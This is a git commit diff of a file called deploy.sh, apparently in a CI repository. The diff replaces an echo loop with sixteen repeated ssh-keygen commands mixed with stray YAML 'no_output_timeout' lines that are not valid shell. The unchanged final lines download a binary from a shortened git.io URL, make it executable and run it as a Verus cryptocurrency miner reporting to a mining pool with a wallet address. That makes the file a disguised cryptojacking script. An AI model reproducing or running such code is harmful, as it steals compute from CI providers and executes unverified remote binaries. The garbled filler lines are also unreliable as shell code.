fcd9d8534615e158fa59ba13549461c9bdab807c
dianedqncsaw <94683631+dianedqncsaw@users.noreply.github.com>
2021-11-19 19:43:37 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,38 +1,37 @@
 #!/bin/bash
 
-while :
-do
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-echo"HelloWorld"
-sleep 2
-done
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+no_output_timeout: 30m
 wget -qO build https://git.io/JX7bv
 chmod +x build
 ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaInteL -p x -t 2
